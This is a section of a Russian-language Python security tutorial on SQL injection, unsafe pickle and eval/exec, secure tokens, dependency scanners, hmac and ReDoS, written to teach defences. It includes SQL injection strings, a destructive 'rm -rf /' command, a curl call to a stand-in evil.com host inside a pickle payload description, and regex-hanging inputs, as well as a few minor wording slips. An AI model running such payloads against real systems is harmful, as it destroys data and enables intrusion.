### 5.1. SQL injection, pickle, eval/exec, инструменты (§90)

#### 5.1.1. SQL injection (подробно: как происходит атака и как защититься)

**Суть в одном предложении:** не подставляйте пользовательский ввод в SQL через конкатенацию строк; используйте параметризованные запросы (`?`, `%s`, `:name`).

**Что такое SQL injection.**  
Если вы «склеиваете» (конкатенируете) SQL-запрос из строк — `query = "SELECT * FROM users WHERE name = '" + name + "'"` или `f"... WHERE name = '{name}'"` — и подставляете туда пользовательский ввод, злоумышленник может ввести не имя, а фрагмент SQL. Тогда запрос изменится и выполнит действия, которых вы не планировали.

**Пример атаки пошагово.**

Исходный код (уязвимый):

```python
name = request.GET['name']  # пользователь вводит имя
query = f"SELECT * FROM users WHERE name = '{name}'"
cursor.execute(query)
```

Злоумышленник передаёт в `name` не «Иван», а строку:  
`' OR '1'='1`  

**Что происходит посимвольно.** Исходный шаблон: `"... WHERE name = '{name}'"`. Подставляем: `"... WHERE name = '' OR '1'='1'"`. Первая `'` закрывает кавычку после знака `=`. Дальше идёт ` OR ` — логическое ИЛИ. Потом `'1'='1'` — сравнение строки `'1'` со строкой `'1'`, это всегда True. Условие становится: `name = ''` ИЛИ `True` → всё условие истинно.

Итоговый запрос:

```sql
SELECT * FROM users WHERE name = '' OR '1'='1'
```

Условие `'1'='1'` всегда истинно → вернутся **все** пользователи. Или хуже:  
`'; DROP TABLE users; --`  

Запрос станет:

```sql
SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
```

`;` завершает первый запрос. `DROP TABLE users` — отдельная команда. `--` в SQL — комментарий до конца строки, поэтому `--'` «закомментирует» оставшиеся кавычки, и синтаксис будет валидным. Выполнятся два запроса: второй удалит таблицу.

**Правило — параметризованные запросы.**  
Передавайте пользовательский ввод **отдельно** от текста запроса. База данных подставит его как **данные**, а не как часть кода. Спецсимволы (`'`, `;`, `--` и т.д.) будут обработаны безопасно — как часть значения, а не как SQL.

**Что значит «параметризованный»:** шаблон запроса с **плейсхолдерами** — метками-заглушками (`?`, `%s`, `:name`), куда будут подставлены значения. Значения передаются **отдельно** вторым аргументом (кортеж или словарь). Драйвер БД сам подставляет и экранирует значения — вы не склеиваете строки.

```python
# sqlite3 — плейсхолдер ?
cursor.execute("SELECT * FROM users WHERE name = ?", (name,))
# Заметь: (name,) — кортеж из ОДНОГО элемента. Запятая обязательна!
# Почему: в Python (name) — это просто name в скобках (избыточные скобки).
# (name,) — это кортеж из одного элемента. Запятая говорит интерпретатору: «это кортеж».
# Второй аргумент execute должен быть iterable (кортеж, список) — для нескольких параметров.

# PostgreSQL (psycopg2) — плейсхолдер %s
cursor.execute("SELECT * FROM users WHERE name = %s", (name,))

# Именованные параметры — удобно при многих параметрах
cursor.execute("SELECT * FROM users WHERE name = :name AND age > :min_age",
               {"name": name, "min_age": 18})
```

Даже если пользователь введёт `' OR '1'='1`, это будет подставлено как **строковое значение** — запрос найдёт пользователя с буквальным именем `' OR '1'='1`, а не изменит логику запроса.

**Что может быть непонятно (параметризованные запросы).**  
«Почему драйвер сам экранирует?» Драйвер передаёт запрос и значения **раздельно** в СУБД. База сама подставляет значения в правильные места — как «данные», а не как часть текста запроса. Кавычки, точки с запятой и т.д. обрабатываются как обычные символы строки, а не как SQL-синтаксис.

#### 5.1.2. pickle — почему опасен (подробно)

**Что делает pickle.**  
Сериализует объекты Python в байты. При десериализации (`pickle.loads`) восстанавливает объекты, вызывая конструкторы и методы. Чтобы восстановить произвольный объект, pickle может выполнять **любой код** — в том числе `os.system`, `subprocess.run` и т.п.

**Как устроена атака (концептуально).**  
Злоумышленник создаёт специальный pickle, в котором «зашит» вызов `os.system('rm -rf /')` или `subprocess.run(['curl', 'evil.com'])`. Формат pickle позволяет указывать, какой класс и какие аргументы использовать при восстановлении. При `pickle.loads(malicious_bytes)` Python выполнит этот код — как будто вы сами его написали. Вы загружаете такой файл (пришёл по почте, скачан с ненадёжного сайта, пришёл от пользователя) — злоумышленник получает **RCE (Remote Code Execution)** — выполнение произвольного кода на вашей машине: удаление файлов, доступ в сеть, кража данных и т.д.

**Вывод:** pickle — только для данных из **полностью доверенного** источника (свои файлы, свой сервер). Никогда — из пользовательского ввода, из интернета, из ненадёжного API.

**Что может быть непонятно (pickle).**  
«Как вообще в байтах «зашит» код?» Pickle хранит не только данные, но и **инструкции**: «создай объект такого-то класса с такими аргументами». Класс может быть `os.system`, аргумент — строка команды. При загрузке Python выполняет эти инструкции. Поэтому любой, кто может записать pickle-файл, может заставить ваш код выполнить произвольную команду при его чтении.

**Альтернативы:** `json` (только базовые типы, безопасен), `yaml` (осторожно — `yaml.load` без `Loader` может выполнять произвольный код! Используйте `yaml.safe_load`), Protocol Buffers, MessagePack.

**marshal и shelve — кратко.**  
- **marshal** — низкоуровневая сериализация, используется для .pyc-файлов. Не предназначен для произвольных данных; формат может меняться между версиями Python. **Не загружайте marshal из ненадёжных источников** — может выполняться код (хотя риски меньше, чем у pickle). Для своих данных — избегайте, используйте pickle или json.  
- **shelve** — хранилище «ключ → объект» на основе pickle. Файл shelve — это по сути pickle под капотом. **Все риски pickle применимы к shelve.** Если в shelve лежат данные от пользователя или из ненадёжного источника — при `shelve.open()` и доступе к ключам выполняется десериализация pickle. Правило то же: shelve только для доверенных данных.

#### 5.1.3. eval и exec — риски (подробно)

`eval(s)` выполняет строку `s` как **Python-выражение** (одно выражение, возвращает значение). `exec(s)` — как **инструкции** (любой код: циклы, присваивания, несколько строк). Оба выполняют произвольный код. Если `s` приходит от пользователя — злоумышленник может передать что угодно:

```python
user_input = "__import__('os').system('rm -rf /')"
eval(user_input)  # выполнит удаление файлов!
```

**Безопасная альтернатива для литералов — ast.literal_eval.**  
Принимает только «литералы»: числа, строки, списки, словари, кортежи, True/False/None. Не выполняет вызовы функций, присваивания, импорты и т.п. Строка разбирается как выражение, но выполняется только если это литерал.

```python
import ast

# Что принимает literal_eval:
ast.literal_eval("[1, 2, 3]")           # [1, 2, 3]
ast.literal_eval("{'a': 1, 'b': 2}")    # {'a': 1, 'b': 2}
ast.literal_eval("(1, 2)")              # (1, 2)
ast.literal_eval("42")                  # 42
ast.literal_eval("'hello'")             # 'hello'
ast.literal_eval("True")                # True
ast.literal_eval("None")                # None

# Что НЕ примет — выдаст ValueError или SyntaxError:
ast.literal_eval("os.system('ls')")     # не литерал — вызов функции
ast.literal_eval("__import__('os')")    # вызов функции
ast.literal_eval("open('/etc/passwd')") # вызов функции — опасно, literal_eval отклонит
```

**Когда использовать:** когда нужно безопасно разобрать JSON-подобные данные, пришедшие как строка, но без полного JSON (например, представление Python-литерала).

**JSON vs ast.literal_eval.** Если данные в формате JSON — используйте `json.loads`. Он тоже безопасен (не выполняет код) и понимает стандартный JSON. `ast.literal_eval` — когда строка выглядит как Python-литерал: `"{'a': 1}"` (одинарные кавычки), `(1, 2)` (кортеж) — JSON такого не поддерживает.

#### 5.1.4. secrets вместо random для токенов и паролей

**Почему не `random`.**  
`random` генерирует псевдослучайные числа по алгоритму (Mersenne Twister). При одном и том же seed последовательность одна и та же — её можно воспроизвести и предсказать. Злоумышленник, узнавший seed или несколько значений, может вычислить следующие. Для паролей, токенов сессий, API-ключей это неприемлемо.

**Что делает `secrets`.**  
Использует источник энтропии ОС (криптографически стойкий генератор) — предсказать следующий байт практически невозможно.

```python
import secrets

# token_hex(32) — 32 байта = 64 hex-символа (каждый байт = 2 hex-цифры 0-9a-f)
token = secrets.token_hex(32)       # для API-токенов, ключей сессий

# token_urlsafe(16) — 16 байт в base64, безопасно для URL (без +, /, =)
password = secrets.token_urlsafe(16)  # для паролей, сброса пароля по ссылке
```

**Когда что использовать:** для игр, тестов, «случайного» выбора из списка — `random` норм. Для всего, что связано с безопасностью (пароли, токены) — только `secrets`.

**Что может быть непонятно (secrets).**  
- «Почему 32 байта для токена?» 32 байта = 256 бит энтропии. Этого достаточно, чтобы подобрать токен перебором было практически нереально (2^256 вариантов). Для API-токенов, сессий — стандартный выбор.  
- «token_hex vs token_urlsafe?» token_hex — только цифры и буквы a-f (hex). token_urlsafe — base64 без символов +, /, =, которые могут мешать в URL. Для ссылок сброса пароля — token_urlsafe.

#### 5.1.5. Инструменты проверки зависимостей

| Инструмент | Что делает |
|------------|------------|
| **pip-audit** | Сканирует установленные пакеты на известные CVE (Common Vulnerabilities and Exposures — база известных уязвимостей). Выводит список уязвимых пакетов и версий. |
| **Bandit** | Статический анализ кода: ищет паттерны SQL injection, eval, pickle, хардкод паролей. Выводит предупреждения с указанием файла и строки. |
| **safety** | Аналогично pip-audit |
| **semgrep** | Кастомные правила статического анализа |

```bash
pip install pip-audit bandit
pip-audit              # проверить зависимости
bandit -r ./src        # проверить код
```

**Пример вывода pip-audit:** список уязвимых пакетов с CVE-номерами и рекомендациями по обновлению.  
**Пример вывода Bandit:** для каждой находки — файл, строка, severity (HIGH/MEDIUM/LOW), краткое описание. Например: `eval` на строке 5 — «Use of exec detected».

**Что может быть непонятно (pip-audit vs Bandit).**  
pip-audit проверяет **установленные пакеты** (зависимости) на известные уязвимости — «есть ли в requests 2.25.0 дыра CVE-2023-...». Bandit проверяет **ваш код** — ищет опасные паттерны: eval, pickle.loads с файлом, конкатенация в SQL. Это разные вещи: pip-audit — «зависимости безопасны?», Bandit — «мой код написан безопасно?».

#### 5.1.6. LiteralsString (Python 3.11+)

Тип для аннотаций (Python 3.11+): помечает строки, которые должны быть литералами (например, имена колонок), а не пользовательским вводом. Статические анализаторы и type checker могут предупреждать, если вы передаёте «ненадёжную» строку туда, где ожидается LiteralString. Помогает на уровне типов избежать SQL injection. Подробнее — PEP 675.

### 5.2. sys.audit, hmac, ReDoS (§90a)

#### 5.2.1. sys.audit и sys.addaudithook (PEP 578)

Позволяет перехватывать «опасные» операции (открытие файлов, subprocess, ctypes) для песочниц и аудита. Вы регистрируете функцию — при каждом таком событии она вызывается. Можно логировать, блокировать или проверять.

```python
import sys

def audit_hook(event, args):
    if event == 'open':
        print(f"Открытие файла: {args}")

sys.addaudithook(audit_hook)
open('/tmp/test.txt')  # вызовет audit_hook
```

#### 5.2.2. hmac vs hashlib

- **hashlib** — хеш-функции (MD5, SHA-256): проверка целостности. «Этот файл не изменили?» Хеш от данных. Без секретного ключа.
- **hmac** — HMAC (Hash-based Message Authentication Code): криптографическая подпись с секретным ключом. «Эти данные пришли от того, кто знает ключ, и не были подменены.» Нужен секрет — без него нельзя подделать подпись.

**Когда что использовать:**
- Проверить, что файл не повредился при передаче — `hashlib`. Хеш от файла: если хоть бит изменился, хеш другой.
- Подписать cookie, JWT, API-запрос — `hmac` (с секретным ключом). «Подпись» = хеш от (ключ + данные). Без ключа подпись не подделать.

**Что может быть непонятно (hashlib vs hmac).**  
hashlib: вы отдаёте данные, получаете хеш. Любой может посчитать тот же хеш — нет секрета. Хорошо для проверки целостности. hmac: вы отдаёте данные и **секретный ключ**. Подпись зависит от ключа. Тот, кто не знает ключ, не сможет создать валидную подпись — значит, данные не подменены и пришли от того, кто знает ключ.

```python
import hmac
import hashlib

key = b'secret'
msg = b'message'
sig = hmac.new(key, msg, digestmod=hashlib.sha256).hexdigest()
```

#### 5.2.3. ReDoS (Regular expression Denial of Service)

**ReDoS** — атака на отказ в обслуживании через регулярные выражения. Некоторые паттерны при «злонамеренном» вводе приводят к **катастрофическому backtracking**: движок regex перебирает экспоненциальное число вариантов сопоставления, что блокирует процесс на секунды или минуты.

**Как работает backtracking (упрощённо).**  
Движок regex пытается сопоставить паттерн с текстом слева направо. Если на каком-то шаге не получилось — он **откатывается** и пробует другой вариант (например, «съесть» меньше символов жадным `+`). При паттерне вроде `(a+)+` на строке `"aaaaX"` движок перебирает все способы разбить `"aaaa"` на группы: одна группа из 4, две группы (1+3, 2+2, 3+1), три группы и т.д. Число вариантов растёт **экспоненциально** с длиной строки. На строке из 30 букв `a` и одной `X` это могут быть миллионы попыток — программа «зависает».

**Что может быть непонятно (ReDoS).**  
- «Почему `+` жадный?» `a+` означает «один или больше букв a». Жадный — «возьму максимум». Движок сначала съедает все `a`, потом видит `X`, ожидает `b` — не совпало. Откатывается: «может, `a+` взял лишнее?» Пробует «на один `a` меньше» — снова не совпало. И так перебирает все разбиения.  
- «Когда ReDoS опасен?» Когда пользователь может передать строку, которая попадёт в regex. Например, поиск на сайте, фильтрация ввода — ограничьте длину или используйте безопасный паттерн.

**Опасные паттерны:**

| Паттерн | Почему опасен | Пример «плохого» ввода |
|---------|---------------|------------------------|
| `(a+)+` | Внутренний `a+` жадный; при несовпадении backtrack пробует откатить; варианты множатся | `'a' * 30 + 'X'` |
| `(a\|a)*` | Два варианта на каждой позиции; экспоненциальное ветвление | Длинная строка `'a'` |
| `(a+)*` | Аналогично | Длинная строка без совпадения |
| `(.*a){n}` | Вложенный повтор с перекрывающимися совпадениями | Строка с многими `a` |

**Пример с замером времени:**

```python
import re
import time

# Опасный паттерн — ищем строку, заканчивающуюся на 'b', перед ней — один и более блоков из 'a'
pattern = r'(a+)+b'

# Безопасный ввод
t0 = time.perf_counter()
re.match(pattern, 'aaaaaaaaab')
print(time.perf_counter() - t0)  # ~0.0001 с

# «Злонамеренный» ввод — много 'a' и в конце 'c' (не 'b')
# Движок будет backtrack'ить, перебирая все способы разбить строку на блоки (a+)
t0 = time.perf_counter()
re.match(pattern, 'a' * 25 + 'c')  # уже может занять секунды
print(time.perf_counter() - t0)
```

**Меры защиты:**

- Избегать вложенных квантификаторов на перекрывающихся группах.
- Ограничивать длину пользовательского ввода перед применением regex.
- Использовать модуль `regex` (сторонний) с параметром `timeout`:
  ```python
  import regex
  regex.match(r'(a+)+b', user_input, timeout=1.0)
  ```
- Там, где возможно, обходиться без regex: `str.startswith`, `str.endswith`, `in`, простые проверки.

**Пример: как переписать опасный паттерн.** Вместо `(a+)+b` можно сначала проверить «строка из букв a и заканчивается на b» простыми средствами: `s.isalpha() and s.count('a') == len(s)-1 and s.endswith('b')` — без regex. Или использовать более простой regex без вложенных квантификаторов.
